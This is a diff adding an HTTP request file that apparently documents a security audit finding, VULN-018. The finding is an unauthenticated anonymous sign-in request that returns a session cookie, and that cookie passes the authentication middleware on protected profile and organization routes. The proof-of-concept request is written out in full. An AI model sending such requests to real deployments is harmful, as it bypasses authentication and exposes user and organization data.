@@ -1,0 +1,12 @@
+### VULN-018 — Unauthenticated session via anonymous() plugin
+### Not covered by signupGuard (which only wraps /api/auth/sign-up/*).
+POST http://localhost:21527/api/auth/sign-in/anonymous HTTP/1.1
+Host: localhost:21527
+Origin: http://localhost:21526
+Content-Type: application/json
+
+{}
+
+### Response sets Cookie: classroomio.session_token=... for a user with isAnonymous=true.
+### That cookie then satisfies authMiddleware / authOrApiKeyMiddleware on protected routes
+### (e.g. GET /account/profile, GET /organization) that return 401 without it.
